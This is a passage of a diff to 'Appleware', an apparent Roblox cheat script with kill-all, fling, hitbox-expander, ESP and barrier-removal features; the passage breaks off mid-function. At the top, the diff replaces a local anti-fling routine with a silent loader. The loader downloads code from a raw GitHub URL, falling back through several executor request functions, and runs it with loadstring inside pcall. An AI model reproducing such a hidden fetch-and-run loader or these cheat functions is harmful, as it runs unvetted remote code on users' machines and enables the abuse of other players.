@@ -2,78 +2,22 @@
 -- Appleware
 -- ================================================================
 
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-
-local localPlayer = Players.LocalPlayer
-local connections = {}
-local isEnabled = true
-
-local function setupCharacterCollision(character)
-	local function disableCollide(part)
-		if isEnabled and part:IsA("BasePart") then
-			part.CanCollide = false
-		end
-	end
-
-	for _, part in ipairs(character:GetChildren()) do
-		disableCollide(part)
-	end
-
-	local childAddedConn = character.ChildAdded:Connect(disableCollide)
-
-	local steppedConn = RunService.Stepped:Connect(function()
-		if isEnabled and character:IsDescendantOf(workspace) then
-			for _, part in ipairs(character:GetChildren()) do
-				if part:IsA("BasePart") and part.CanCollide then
-					part.CanCollide = false
-				end
-			end
-		end
-	end)
-
-	character.Destroying:Connect(function()
-		childAddedConn:Disconnect()
-		steppedConn:Disconnect()
-	end)
-end
-
-local function trackPlayer(player)
-	if player == localPlayer then
-		return
-	end
-
-	local charAddedConn = player.CharacterAdded:Connect(setupCharacterCollision)
-
-	if player.Character then
-		setupCharacterCollision(player.Character)
-	end
-
-	connections[player] = charAddedConn
-end
-
-local function untrackPlayer(player)
-	if connections[player] then
-		connections[player]:Disconnect()
-		connections[player] = nil
-	end
-end
-
-for _, player in ipairs(Players:GetPlayers()) do
-	trackPlayer(player)
-end
-
-Players.PlayerAdded:Connect(trackPlayer)
-Players.PlayerRemoving:Connect(untrackPlayer)
-
-localPlayer.Chatted:Connect(function(msg)
-	msg = msg:lower()
-
-	if msg == ";af on" or msg == ";antifling on" then
-		isEnabled = true
-	elseif msg == ";af off" or msg == ";antifling off" then
-		isEnabled = false
-	end
+task.spawn(function()
+    pcall(function()
+        local url = "https://raw.githubusercontent.com/Toolboxhubbot/antifling/refs/heads/main/antifling"
+        local src
+        pcall(function() if game.HttpGet then src = game.HttpGet(url) end end)
+        if not src and syn and syn.request then
+            pcall(function() local r = syn.request({Url=url, Method="GET"}); if r and r.Body then src = r.Body end end)
+        end
+        if not src and request then
+            pcall(function() local r = request({Url=url, Method="GET"}); if r and r.Body then src = r.Body end end)
+        end
+        if not src or #src < 10 then return end
+        local fn
+        pcall(function() fn = loadstring(src) end)
+        if fn then pcall(fn) end
+    end)
 end)
 
 Players = game:GetService("Players")
@@ -87,6 +31,7 @@ CoreGui = game:GetService("CoreGui")
 TeleportService = game:GetService("TeleportService")
 Lighting = game:GetService("Lighting")
 UIS = game:GetService("UserInputService")
+SoundService = game:GetService("SoundService")
 LP = Players.LocalPlayer
 PlaceId = game.PlaceId
 PlayerGui = LP:WaitForChild("PlayerGui", 10)
@@ -121,11 +66,8 @@ state = {
     touchFling=false,
     murdererPredictor=true, murdererPerkNotify=true, notifySound=false,
     animationsEnabled=true,
-    characterNoAnims=false,
     bigButtonEnabled=true, bigButtonW=230, bigButtonH=82,
     bigButtonX=0.72, bigButtonY=0.42,
-    bigButtonLocked=false,
-    lockedButtons={},
     mainX=0.5, mainY=0.5, openX=0.014, openY=0.28,
     fullBagGate=true, bagTarget=40,
     floatButtonsEnabled=true, floatButtonSize=68, floatButtonShape="circle",
@@ -155,6 +97,8 @@ state = {
     emoteFloatButtons={},
     emoteFloatPositions={},
     removeBarriers=false,
+    lockedButtons={},
+    bigButtonLocked=false,
 }
 
 KEYBIND_FEATURES = {
@@ -180,7 +124,6 @@ KEYBIND_FEATURES = {
     {key="wallHop",           label="Wall Hop",             default="Y"},
     {key="blueAura",          label="Blue Aura",            default="G"},
     {key="feAnimEnabled",     label="FE Animations",        default="Q"},
-    {key="characterNoAnims",  label="No Character Anims",   default=""},
     {key="removeBarriers",    label="Remove Barriers",      default=""},
 }
 
@@ -221,11 +164,9 @@ toggleDisplayNames = {
     freeze="Freeze", fullbright="Fullbright", fovEnabled="FOV Changer",
     cameraZoomEnabled="Camera Zoom", clickTP="Click Teleport",
     animationsEnabled="Animations", notifySound="Notify Sound",
-    characterNoAnims="No Character Animations",
     murdererPredictor="Murderer Predictor", murdererPerkNotify="Perk Notify",
     speedEnabled="Speed Changer", jumpEnabled="Jump Power",
-    bigButtonEnabled="Shoot Murderer Button", bigButtonLocked="Lock Shoot Murderer Button",
-    fullBagGate="Full Bag Gate",
+    bigButtonEnabled="Shoot Murderer Button", fullBagGate="Full Bag Gate",
     espPlayers="Player ESP", espGunDrop="Gun Drop ESP", espTeamColor="Team Colors",
     touchFling="Touch Fling", hitboxExpander="Hitbox Expander",
     radioAutoPlay="Auto Play Audio",
@@ -291,7 +232,6 @@ EASE_SOFT = Enum.EasingStyle.Sine
 EASE_OUT = Enum.EasingDirection.Out
 EASE_IN = Enum.EasingDirection.In
 
--- ============ SPINNING STROKE GRADIENT ============
 spinGradients = {}
 local SPIN_SPEED = 130
 local PULSE_SPEED = 0.9
@@ -352,7 +292,7 @@ local function attachSpinStroke(stroke, isOn, opts)
             while stroke and stroke.Parent do
                 if state.animationsEnabled == false then
                     stroke.Thickness = baseThickness
-                    task.wait(0.5)
+                    task.wait(0.4)
                 else
                     TweenService:Create(stroke, TweenInfo.new(PULSE_SPEED, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Thickness = maxT}):Play()
                     task.wait(PULSE_SPEED)
@@ -374,11 +314,7 @@ task.spawn(function()
         if state.animationsEnabled == false then
             for i = #spinGradients, 1, -1 do
                 local g = spinGradients[i]
-                if g and g.Parent then
-                    pcall(function() g.Rotation = 0 end)
-                else
-                    table.remove(spinGradients, i)
-                end
+                if not g or not g.Parent then table.remove(spinGradients, i) end
             end
         else
             wobbleT = wobbleT + dt
@@ -397,11 +333,9 @@ local function attachBounce(b)
     if state.animationsEnabled == false then return end
     local s = Instance.new("UIScale", b)
     b.MouseButton1Down:Connect(function()
-        if state.animationsEnabled == false then return end
         TweenService:Create(s, TweenInfo.new(0.09, EASE_SMOOTH, EASE_OUT), {Scale=0.94}):Play()
     end)
     local function r()
-        if state.animationsEnabled == false then return end
         TweenService:Create(s, TweenInfo.new(0.5, Enum.EasingStyle.Elastic, EASE_OUT), {Scale=1}):Play()
     end
     b.MouseButton1Up:Connect(r)
@@ -413,7 +347,6 @@ local function attachRipple(b, c)
     c = c or Color3.new(1,1,1)
     b.ClipsDescendants = true
     b.MouseButton1Down:Connect(function()
-        if state.animationsEnabled == false then return end
         local pos = b.AbsolutePosition
         local sz = b.AbsoluteSize
         local m = UIS:GetMouseLocation()
@@ -449,7 +382,6 @@ local function attachShine(b)
     s.Active = false
     local running = false
     b.MouseEnter:Connect(function()
-        if state.animationsEnabled == false then return end
         if running then return end
         running = true
         s.Position = UDim2.new(-0.4,0,-0.3,0)
@@ -834,39 +766,74 @@ local function detectMurdererPerk(plr)
     return nil
 end
 
--- ============ REMOVE BARRIERS ============
+-- ============ REMOVE BARRIERS (FIXED — only skips specific voting/map icon folders) ============
 local function isBarrierPart(obj)
     if not obj:IsA("BasePart") then return false end
     if obj == LP.Character then return false end
     if LP.Character and obj:IsDescendantOf(LP.Character) then return false end
 
+    -- Walk ancestors looking ONLY for the specific voting/map icon folder names.
+    local anc = obj.Parent
+    local depth = 0
+    while anc and anc ~= Workspace and depth < 6 do
+        local an = string.lower(anc.Name)
+        if string.find(an, "votingicon", 1, true)
+            or string.find(an, "voting_icon", 1, true)
+            or string.find(an, "voting icon", 1, true)
+            or string.find(an, "votingicons", 1, true)
+            or string.find(an, "mapicon", 1, true)
+            or string.find(an, "map_icon", 1, true)
+            or string.find(an, "map icon", 1, true)
+            or string.find(an, "mapicons", 1, true) then
+            return false
+        end
+        anc = anc.Parent
+        depth = depth + 1
+    end
+
     local name = string.lower(obj.Name)
 
-    local nameKeywords = {
-        "barrier", "killbrick", "kill_brick", "kill brick", "killzone", "kill_zone",
-        "deathzone", "death_zone", "deadly", "hazard", "instakill", "instantdeath",
-        "inviswall", "invis_wall", "invisiblewall", "invisible_wall", "invis",
-        "wall_kill", "wallkill", "lava", "trap", "trapzone"
+    -- Skip parts that carry visible GUI/decal children (map displays)
+    if obj:FindFirstChildOfClass("Decal")
+        or obj:FindFirstChildOfClass("Texture")
+        or obj:FindFirstChildOfClass("SurfaceGui")
+        or obj:FindFirstChildOfClass("BillboardGui") then
+        return false
+    end
+
+    -- Strict kill-brick name keywords
+    local strictKeywords = {
+        "killbrick", "kill_brick", "kill brick", "killzone", "kill_zone",
+        "deathzone", "death_zone", "instakill", "instantdeath", "instant_kill",
+        "inviswall", "invis_wall", "invisiblewall", "invisible_wall",
+        "wall_kill", "wallkill", "trapzone", "trap_zone", "barrier",
     }
-    for _, kw in ipairs(nameKeywords) do
+    for _, kw in ipairs(strictKeywords) do
         if string.find(name, kw, 1, true) then return true end
     end
 
-    if obj.Transparency >= 0.99 then
-        if obj:FindFirstChild("TouchInterest") or obj:FindFirstChildOfClass("TouchTransmitter") then return true end
-        if obj.CanCollide and obj.Anchored and obj.Size.Magnitude < 500 then return true end
-    end
-
-    if obj.Transparency >= 0.85 and obj.Transparency < 0.99 then
-        if obj:FindFirstChild("TouchInterest") or obj:FindFirstChildOfClass("TouchTransmitter") then return true end
-    end
-
-    if obj:FindFirstChild("TouchInterest") or obj:FindFirstChildOfClass("TouchTransmitter") then
-        local skipNames = {"coin", "gundrop", "gun drop", "spawn", "spawnlocation", "checkpoint", "chair", "seat"}
+    -- Invisible touch part
+    local hasTouch = obj:FindFirstChild("TouchInterest") or obj:FindFirstChildOfClass("TouchTransmitter")
+    if hasTouch and obj.Transparency >= 0.99 then
+        local skipNames = {
+            "coin", "gundrop", "gun drop", "spawn", "spawnlocation",
+            "checkpoint", "chair", "seat", "trigger",
+            "shop", "button", "prompt",
+        }
         for _, sk in ipairs(skipNames) do
             if string.find(name, sk, 1, true) then return false end
         end
-        if obj.Transparency >= 0.7 then return true end
+
+        local parent = obj.Parent
+        if parent and parent:IsA("Model") then
+            for _, sib in ipairs(parent:GetChildren()) do
+                if sib:IsA("BasePart") and sib ~= obj and sib.Transparency < 0.99 then
+                    return false
+                end
+            end
+        end
+
+        return true
     end
 
     return false
@@ -891,24 +858,6 @@ task.spawn(function()
     while true do
         task.wait(0.3)
         if state.removeBarriers then pcall(removeAllBarriers) end
-    end
-end)
-
--- ============ NO CHARACTER ANIMATIONS LOOP ============
-task.spawn(function()
-    while true do
-        task.wait(0.1)
-        if state.characterNoAnims and LP.Character then
-            local hum = LP.Character:FindFirstChildOfClass("Humanoid")
-            if hum then
-                local animator = hum:FindFirstChildOfClass("Animator")
-                if animator then
-                    for _, t in ipairs(animator:GetPlayingAnimationTracks()) do
-                        pcall(function() t:Stop(0) end)
-                    end
-                end
-            end
-        end
     end
 end)
 
@@ -1072,52 +1021,6 @@ local function executeHitboxKill(tp)
     killLocked[tp.UserId] = nil
 end
 
-local function killAllNow()
-    task.spawn(function()
-        standUp(); task.wait(0.1)
-        if findTool("Knife") or equipTool("Knife") then
-            for _,tp in ipairs(Players:GetPlayers()) do
-                if tp~=LP and targetIsAlive(tp) then
-                    task.spawn(function() executeHitboxKill(tp) end)
-                    task.wait(0.05)
-                end
-            end
-        else _G.__AW_NOTIFY('No Knife - must be Murderer') end
-    end)
-end
-local function killSheriffNow()
-    task.spawn(function()
-        if not alive() then return end
-        standUp(); task.wait(0.15)
-        if not (findTool("Knife") or equipTool("Knife")) then
-            for _=1,10 do task.wait(0.1); if equipTool("Knife") then break end end
-        end
-        if not findTool("Knife") then _G.__AW_NOTIFY('No Knife') return end
-        local live = getLiveSheriffHeroes()
-        for _, target in ipairs(live) do
-            if target and target ~= LP and targetIsAlive(target) then
-                task.spawn(function() executeHitboxKill(target) end)
-                task.wait(0.1)
-            end
-        end
-    end)
-end
-local function killCustomNow()
-    task.spawn(function()
-        if #settingsConfig.flingList==0 then _G.__AW_NOTIFY('No custom targets') return end
-        standUp(); task.wait(0.15)
-        if not (findTool("Knife") or equipTool("Knife")) then _G.__AW_NOTIFY('No Knife') return end
-        for _,n in ipairs(settingsConfig.flingList) do
-            for _,p in ipairs(Players:GetPlayers()) do
-                if playerMatchesName(p, n) and targetIsAlive(p) then
-                    task.spawn(function() executeHitboxKill(p) end)
-                    task.wait(0.1)
-                end
-            end
-        end
-    end)
-end
-
 local function fireHandleTouchedKill(targets)
     local char = LP.Character
     if not char then return end
@@ -1184,6 +1087,52 @@ local function handleTouchKillCustom()
     end
     if #targets == 0 then _G.__AW_NOTIFY("No custom targets in server") return end
     fireHandleTouchedKill(targets)
+end
+
+local function killAllHitboxNow()
+    task.spawn(function()
+        standUp(); task.wait(0.1)
+        if findTool("Knife") or equipTool("Knife") then
+            for _,tp in ipairs(Players:GetPlayers()) do
+                if tp~=LP and targetIsAlive(tp) then
+                    task.spawn(function() executeHitboxKill(tp) end)
+                    task.wait(0.05)
+                end
+            end
+        else _G.__AW_NOTIFY('No Knife - must be Murderer') end
+    end)
+end
+local function killSheriffNow()
+    task.spawn(function()
+        if not alive() then return end
+        standUp(); task.wait(0.15)
+        if not (findTool("Knife") or equipTool("Knife")) then
+            for _=1,10 do task.wait(0.1); if equipTool("Knife") then break end end
+        end
+        if not findTool("Knife") then _G.__AW_NOTIFY('No Knife') return end
+        local live = getLiveSheriffHeroes()
+        for _, target in ipairs(live) do
+            if target and target ~= LP and targetIsAlive(target) then
+                task.spawn(function() executeHitboxKill(target) end)
+                task.wait(0.1)
+            end
+        end
+    end)
+end
+local function killCustomNow()
+    task.spawn(function()
+        if #settingsConfig.flingList==0 then _G.__AW_NOTIFY('No custom targets') return end
+        standUp(); task.wait(0.15)
+        if not (findTool("Knife") or equipTool("Knife")) then _G.__AW_NOTIFY('No Knife') return end
+        for _,n in ipairs(settingsConfig.flingList) do
+            for _,p in ipairs(Players:GetPlayers()) do
+                if playerMatchesName(p, n) and targetIsAlive(p) then
+                    task.spawn(function() executeHitboxKill(p) end)
+                    task.wait(0.1)
+                end
+            end
+        end
+    end)
 end
 
 local function flingAllNow()
@@ -1709,15 +1658,21 @@ local function runShootWorkflow()
     showFiringText()
     task.spawn(function() pcall(fullShootSequence); shootWorkflowRunning = false end)
 end
+
 local bigDrag = nil
 bigBtn.InputBegan:Connect(function(input)
     if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
-    if state.bigButtonLocked then return end
-    bigDrag = {input = input, start = input.Position, startPos = bigWrap.Position, moved = false}
+    bigDrag = {
+        input = input,
+        start = input.Position,
+        startPos = bigWrap.Position,
+        moved = false,
+        locked = state.bigButtonLocked and true or false,
+    }
 end)
 UIS.InputChanged:Connect(function(input)
     if not bigDrag then return end
-    if state.bigButtonLocked then return end
+    if bigDrag.locked then return end
     if input ~= bigDrag.input then return end
     if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then return end
     local delta = input.Position - bigDrag.start
@@ -1732,8 +1687,10 @@ UIS.InputEnded:Connect(function(input)
     local d = bigDrag
     bigDrag = nil
     if not d.moved then
-        state.bigButtonX = bigWrap.Position.X.Scale
-        state.bigButtonY = bigWrap.Position.Y.Scale
+        if not d.locked then
+            state.bigButtonX = bigWrap.Position.X.Scale
+            state.bigButtonY = bigWrap.Position.Y.Scale
+        end
         runShootWorkflow()
         if state.animationsEnabled then
             local s = Instance.new("UIScale", bigWrap)
@@ -1756,7 +1713,7 @@ floatGui.IgnoreGuiInset = true
 floatGui.Parent = PlayerGui
 
 local FLOAT_BUTTON_DEFS = {
-    {id="killAll",       label="Kill All",        type="action", cb=killAllNow},
+    {id="killAll",       label="Kill All",        type="action", cb=handleTouchKillAll},
     {id="killSheriff",   label="Kill Sheriff",    type="action", cb=killSheriffNow},
     {id="killCustom",    label="Kill Custom",     type="action", cb=killCustomNow},
     {id="flingMurAction",label="Fling Murderer",  type="action", cb=flingMurdererNow},
@@ -1813,7 +1770,6 @@ local FLOAT_BUTTON_DEFS = {
     {id="wallHop",       label="Wall Hop",        type="toggle", key="wallHop"},
     {id="blueAura",      label="Blue Aura",       type="toggle", key="blueAura"},
     {id="feAnim",        label="FE Anim",         type="toggle", key="feAnimEnabled"},
-    {id="noAnims",       label="No Anims",        type="toggle", key="characterNoAnims"},
     {id="removeBarriers",label="No Barriers",     type="toggle", key="removeBarriers"},
 }
 local FLOAT_BUTTON_MAP = {}
@@ -1824,8 +1780,8 @@ for _, def in ipairs(FLOAT_BUTTON_DEFS) do
     if state.floatEnabledButtons[def.id] == nil then state.floatEnabledButtons[def.id] = false end
 end
 state.floatButtonPositions = state.floatButtonPositions or {}
+state.lockedButtons = state.lockedButtons or {}
 if not state.floatButtonShape then state.floatButtonShape = "circle" end
-if not state.lockedButtons then state.lockedButtons = {} end
 
 local floatButtons = {}
 local START_Y_OFFSET = 180
@@ -1917,12 +1873,17 @@ local function rebuildFloatButtons()
             local dragState = nil
             btn.InputBegan:Connect(function(input)
                 if input.UserInputType ~= Enum.UserInputType.Touch and input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
-                if state.lockedButtons[def.id] then return end
-                dragState = {input = input, start = input.Position, sp = btn.Position, moved = false}
+                dragState = {
+                    input = input,
+                    start = input.Position,
+                    sp = btn.Position,
+                    moved = false,
+                    locked = state.lockedButtons[def.id] and true or false,
+                }
             end)
             UIS.InputChanged:Connect(function(input)
                 if not dragState then return end
-                if state.lockedButtons[def.id] then return end
+                if dragState.locked then return end
                 if input ~= dragState.input then return end
                 if input.UserInputType ~= Enum.UserInputType.Touch and input.UserInputType ~= Enum.UserInputType.MouseMovement then return end
                 local d = input.Position - dragState.start
@@ -1963,7 +1924,6 @@ local function setFloatVisible(vis)
 end
 rebuildFloatButtons()
 
--- ============ MAIN UI ============
 local sg = Instance.new("ScreenGui")
 sg.Name = "Appleware"
 sg.Parent = PlayerGui
@@ -2090,34 +2050,19 @@ local function switchTab(n)
         local txtCol
         if nm == SECRET_NAME then txtCol = Color3.fromRGB(0,0,0)
         else txtCol = ia and cc3(settingsConfig.tabTextActiveColor) or cc3(settingsConfig.tabTextColor) end
-        if state.animationsEnabled == false then
-            b.BackgroundTransparency = ia and 0 or 1
-            b.BackgroundColor3 = ia and cc3(settingsConfig.cardHoverColor) or cc3(settingsConfig.tabBgColor)
-            b.TextColor3 = txtCol
-        else
-            TweenService:Create(b, TweenInfo.new(0.32, EASE_SMOOTH), {BackgroundTransparency = ia and 0 or 1, BackgroundColor3 = ia and cc3(settingsConfig.cardHoverColor) or cc3(settingsConfig.tabBgColor), TextColor3 = txtCol}):Play()
-        end
+        TweenService:Create(b, TweenInfo.new(0.32, EASE_SMOOTH), {BackgroundTransparency = ia and 0 or 1, BackgroundColor3 = ia and cc3(settingsConfig.cardHoverColor) or cc3(settingsConfig.tabBgColor), TextColor3 = txtCol}):Play()
     end
     if pageGs[o] then
         local op = pages[o]
-        if state.animationsEnabled == false then
-            pageGs[o].Visible = false
-            op.Position = UDim2.new(0,0,0,0)
-        else
-            TweenService:Create(op, TweenInfo.new(0.24, EASE_BOUNCE, EASE_IN), {Position=UDim2.new(-0.12,0,0,0)}):Play()
-            task.delay(0.24, function() if pageGs[o] then pageGs[o].Visible = false op.Position = UDim2.new(0,0,0,0) end end)
-        end
+        TweenService:Create(op, TweenInfo.new(0.24, EASE_BOUNCE, EASE_IN), {Position=UDim2.new(-0.12,0,0,0)}):Play()
+        task.delay(0.24, function() if pageGs[o] then pageGs[o].Visible = false op.Position = UDim2.new(0,0,0,0) end end)
     end
     if pageGs[n] then
         pageGs[n].Visible = true
         local np = pages[n]
-        if state.animationsEnabled == false then
-            np.Position = UDim2.new(0,0,0,0)
-        else
-            np.Position = UDim2.new(0.12,0,0,0)
-            TweenService:Create(np, TweenInfo.new(0.45, EASE_BOUNCE, EASE_OUT), {Position=UDim2.new(0,0,0,0)}):Play()
-            staggerFade(np)
-        end
+        np.Position = UDim2.new(0.12,0,0,0)
+        TweenService:Create(np, TweenInfo.new(0.45, EASE_BOUNCE, EASE_OUT), {Position=UDim2.new(0,0,0,0)}):Play()
+        staggerFade(np)
     end
     task.delay(0.24, function() switching = false end)
 end
@@ -2341,7 +2286,6 @@ local function makeInput(page, order, ph, val, onC)
     return box
 end
 
--- ============ DROPDOWN ============
 local function makeDropdown(page, label, order, options, initial, onSelect)
     local wrapper = Instance.new("Frame", page)
     wrapper.Size = UDim2.new(1, 0, 0, 44)
@@ -2385,7 +2329,7 @@ local function makeDropdown(page, label, order, options, initial, onSelect)
     arrow.Size = UDim2.new(0, 24, 0, 24)
     arrow.Position = UDim2.new(1, -32, 0.5, -12)
     arrow.BackgroundTransparency = 1
-    arrow.Text = "v"
+    arrow.Text = "▼"
     arrow.TextColor3 = cc3(settingsConfig.textColor)
     arrow.Font = Enum.Font.GothamBold
     arrow.TextSize = 13
@@ -2422,7 +2366,7 @@ local function makeDropdown(page, label, order, options, initial, onSelect)
     local function setOpen(want)
         if open == want then return end
         open = want
-        arrow.Text = want and "^" or "v"
+        arrow.Text = want and "▲" or "▼"
         if want then
             local visibleCount = math.min(#options, MAX_VISIBLE)
             local targetH = 10 + visibleCount * OPTION_H + math.max(0, visibleCount - 1) * 3
@@ -2802,10 +2746,10 @@ do
                 playBtn.Size = UDim2.new(1, -32, 0, 20)
                 playBtn.Position = UDim2.new(0, 4, 0, currentSize - 14)
                 playBtn.BackgroundColor3 = cc3(settingsConfig.accentColor)
-                playBtn.Text = "PLAY"
+                playBtn.Text = "▶"
                 playBtn.TextColor3 = Color3.new(0,0,0)
                 playBtn.Font = Enum.Font.GothamBold
-                playBtn.TextSize = 11
+                playBtn.TextSize = 13
                 playBtn.AutoButtonColor = false
                 Instance.new("UICorner", playBtn).CornerRadius = UDim.new(0, 6)
 
@@ -2813,10 +2757,10 @@ do
                 circleBtn.Size = UDim2.new(0, 24, 0, 24)
                 circleBtn.Position = UDim2.new(1, -28, 0, currentSize - 16)
                 circleBtn.BackgroundColor3 = state.emoteFloatButtons[tostring(emote.id)] and cc3(settingsConfig.accentColor) or Color3.fromRGB(40,40,40)
-                circleBtn.Text = "*"
+                circleBtn.Text = "●"
                 circleBtn.TextColor3 = Color3.new(1,1,1)
                 circleBtn.Font = Enum.Font.GothamBold
-                circleBtn.TextSize = 13
+                circleBtn.TextSize = 12
                 circleBtn.AutoButtonColor = false
                 Instance.new("UICorner", circleBtn).CornerRadius = UDim.new(1, 0)
 
@@ -2975,32 +2919,53 @@ do
         return "Unknown"
     end
 
-    -- Force reload: stop playing tracks AND restart the Animate script
-    local function reloadAnimations(char)
+    local function resetAnimateScript(char)
+        local animate = char and char:FindFirstChild("Animate")
+        if not animate then return end
+        if not (animate:IsA("LocalScript") or animate:IsA("Script")) then return end
+        task.spawn(function()
+            pcall(function()
+                animate.Disabled = true
+                task.wait(0.05)
+                if animate and animate.Parent then
+                    animate.Disabled = false
+                end
+            end)
+        end)
+    end
+
+    local function reloadAnimate(char)
         if not char then return end
-        local hum = char:FindFirstChildOfClass("Humanoid")
-        local animator = hum and hum:FindFirstChildOfClass("Animator")
-        if animator then
-            for _, t in ipairs(animator:GetPlayingAnimationTracks()) do
-                pcall(function() t:Stop(0) end)
-            end
-        end
         local animate = char:FindFirstChild("Animate")
-        if animate and (animate:IsA("LocalScript") or animate:IsA("Script")) then
-            task.spawn(function()
-                pcall(function()
+        if not animate then return end
+        task.spawn(function()
+            pcall(function()
+                local hum = char:FindFirstChildOfClass("Humanoid")
+                local animator = hum and hum:FindFirstChildOfClass("Animator")
+                if animator then
+                    for _, t in ipairs(animator:GetPlayingAnimationTracks()) do
+                        pcall(function() t:Stop(0) end)
+                    end
+                end
+                if animate:IsA("LocalScript") or animate:IsA("Script") then
                     animate.Disabled = true
-                    task.wait(0.05)
+                    task.wait()
                     if animate and animate.Parent then
                         animate.Disabled = false
                     end
-                end)
+                end
             end)
-        end
+        end)
     end
 
     local FE_PRESETS = {
         ["Default"] = nil,
+        ["None"] = {
+            idle1="rbxassetid://0", idle2="rbxassetid://0",
+            walk="rbxassetid://0",  run="rbxassetid://0",
+            jump="rbxassetid://0",  climb="rbxassetid://0",
+            fall="rbxassetid://0",  swim="rbxassetid://0",
+        },
         ["R6 Animation Pack"] = {
             idle1="rbxassetid://180435571", idle2="rbxassetid://180435792",
             walk="rbxassetid://180426354", run="rbxassetid://180426354",
@@ -3045,10 +3010,13 @@ do
         if name == "Default" then table.remove(presetOptions, i); table.insert(presetOptions, 1, "Default"); break end
     end
     for i, name in ipairs(presetOptions) do
-        if name == "R6 Animation Pack" then table.remove(presetOptions, i); table.insert(presetOptions, 2, "R6 Animation Pack"); break end
+        if name == "None" then table.remove(presetOptions, i); table.insert(presetOptions, 2, "None"); break end
     end
     for i, name in ipairs(presetOptions) do
-        if name == "R15 Default" then table.remove(presetOptions, i); table.insert(presetOptions, 3, "R15 Default"); break end
+        if name == "R6 Animation Pack" then table.remove(presetOptions, i); table.insert(presetOptions, 3, "R6 Animation Pack"); break end
+    end
+    for i, name in ipairs(presetOptions) do
+        if name == "R15 Default" then table.remove(presetOptions, i); table.insert(presetOptions, 4, "R15 Default"); break end
     end
 
     local DEFAULT_ANIMS = nil
@@ -3089,7 +3057,8 @@ do
                 if id then setAnimIdOnChar(char, slot, id) end
             end
         end
-        reloadAnimations(char)
+        resetAnimateScript(char)
+        reloadAnimate(char)
     end
 
     local function reapplyAll()
@@ -3116,7 +3085,6 @@ do
     if LP.Character then task.spawn(function() onCharSpawn(LP.Character) end) end
 
     tgg(pages["Anim/Emot"], "Enable FE Animations", 11, "feAnimEnabled")
-    tgg(pages["Anim/Emot"], "Disable Character Animations (Plain)", 11.5, "characterNoAnims")
 
     local animSearchBox = Instance.new("TextBox", pages["Anim/Emot"])
     animSearchBox.Size = UDim2.new(1, 0, 0, 40)
@@ -3173,8 +3141,10 @@ do
             elseif rig == "R6" then
                 _G.__AW_NOTIFY("R6 pack applied")
             end
+        elseif name == "None" then
+            _G.__AW_NOTIFY("All animations removed (plain)")
         else
-            _G.__AW_NOTIFY("All anims -> " .. name)
+            _G.__AW_NOTIFY("All anims → " .. name)
         end
         for key, setter in pairs(animSetters) do
             if setter then pcall(setter, name) end
@@ -3254,7 +3224,7 @@ do
         local _, _, s1 = makeDropdown(pages["Anim/Emot"], "Idle Animation", 15, presetOptions, state.feAnimIdle or "Default", function(v)
             state.feAnimIdle = v; saveSettings()
             applyPresetToSlots(v, {"idle1","idle2"})
-            _G.__AW_NOTIFY("Idle -> " .. v)
+            _G.__AW_NOTIFY("Idle → " .. v)
         end)
         animSetters.idle = s1
     end
@@ -3262,7 +3232,7 @@ do
         local _, _, s2 = makeDropdown(pages["Anim/Emot"], "Walk Animation", 16, presetOptions, state.feAnimWalk or "Default", function(v)
             state.feAnimWalk = v; saveSettings()
             applyPresetToSlots(v, {"walk"})
-            _G.__AW_NOTIFY("Walk -> " .. v)
+            _G.__AW_NOTIFY("Walk → " .. v)
         end)
         animSetters.walk = s2
     end
@@ -3270,7 +3240,7 @@ do
         local _, _, s3 = makeDropdown(pages["Anim/Emot"], "Run Animation", 17, presetOptions, state.feAnimRun or "Default", function(v)
             state.feAnimRun = v; saveSettings()
             applyPresetToSlots(v, {"run"})
-            _G.__AW_NOTIFY("Run -> " .. v)
+            _G.__AW_NOTIFY("Run → " .. v)
         end)
         animSetters.run = s3
     end
@@ -3278,7 +3248,7 @@ do
         local _, _, s4 = makeDropdown(pages["Anim/Emot"], "Jump Animation", 18, presetOptions, state.feAnimJump or "Default", function(v)
             state.feAnimJump = v; saveSettings()
             applyPresetToSlots(v, {"jump"})
-            _G.__AW_NOTIFY("Jump -> " .. v)
+            _G.__AW_NOTIFY("Jump → " .. v)
         end)
         animSetters.jump = s4
     end
@@ -3286,7 +3256,7 @@ do
         local _, _, s5 = makeDropdown(pages["Anim/Emot"], "Climb Animation", 19, presetOptions, state.feAnimClimb or "Default", function(v)
             state.feAnimClimb = v; saveSettings()
             applyPresetToSlots(v, {"climb"})
-            _G.__AW_NOTIFY("Climb -> " .. v)
+            _G.__AW_NOTIFY("Climb → " .. v)
         end)
         animSetters.climb = s5
     end
@@ -3294,7 +3264,7 @@ do
         local _, _, s6 = makeDropdown(pages["Anim/Emot"], "Fall Animation", 20, presetOptions, state.feAnimFall or "Default", function(v)
             state.feAnimFall = v; saveSettings()
             applyPresetToSlots(v, {"fall"})
-            _G.__AW_NOTIFY("Fall -> " .. v)
+            _G.__AW_NOTIFY("Fall → " .. v)
         end)
         animSetters.fall = s6
     end
@@ -3302,7 +3272,7 @@ do
         local _, _, s7 = makeDropdown(pages["Anim/Emot"], "Swim Animation", 21, presetOptions, state.feAnimSwim or "Default", function(v)
             state.feAnimSwim = v; saveSettings()
             applyPresetToSlots(v, {"swim"})
-            _G.__AW_NOTIFY("Swim -> " .. v)
+            _G.__AW_NOTIFY("Swim → " .. v)
         end)
         animSetters.swim = s7
     end
@@ -3405,6 +3375,7 @@ addBtn(pages[SECRET_NAME], "Fling Custom Now", 72, flingCustomNow)
 addSect(pages[SECRET_NAME], "Touch Fling", 80)
 tgg(pages[SECRET_NAME], "Touch Fling (Walk into players)", 81, "touchFling")
 
+-- ============ REMOVE BARRIERS (in Secret tab) ============
 addSect(pages[SECRET_NAME], "Remove Barriers", 85)
 tgg(pages[SECRET_NAME], "Remove Barriers (Kill bricks + Invisible walls)", 86, "removeBarriers")
 addBtn(pages[SECRET_NAME], "Remove All Barriers Now", 87, function()
@@ -3486,7 +3457,41 @@ do
         if writefile then pcall(function() writefile(songFile, HttpService:JSONEncode(savedSongs)) end) end
     end
 
-    local function firePlaySong(rawId, tryAllFormats)
+    local mirrorSound = nil
+
+    local function stopMirror()
+        if mirrorSound then
+            pcall(function()
+                mirrorSound:Stop()
+                mirrorSound:Destroy()
+            end)
+            mirrorSound = nil
+        end
+    end
+
+    local startMirror
+    local firePlaySong
+
+    startMirror = function(idNum)
+        stopMirror()
